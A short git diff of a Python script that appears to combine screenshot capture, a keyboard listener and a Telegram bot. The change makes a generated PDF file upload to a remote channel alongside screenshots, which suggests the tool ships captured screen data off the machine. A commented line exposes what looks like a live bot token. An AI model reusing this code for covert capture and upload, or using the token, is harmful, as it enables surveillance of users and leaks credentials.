@@ -12,6 +12,7 @@ import pyscreenshot as ImageGrab
 import os
 import time
 
+
 from pdf import pdfYap
 from pynput import keyboard
 #os.environ['TOKEN']='1142979898:AAEGJvOstfYNHLKMPYaclsIOx3YsHzjOUPw'
@@ -106,7 +107,9 @@ def mesajYolla():
     updater.bot.send_photo(chat_id=kanalID, photo=open(dosyaAdi, 'rb'))
 
 def pdfYolla():
-    pdfYap()
+    dosyaAdi=pdfYap()
+    str(dosyaAdi)
+    updater.bot.send_document(chat_id=kanalID, document=open(dosyaAdi,'rb'))
 
 def on_press(key):
     if key == keyboard.Key.esc:
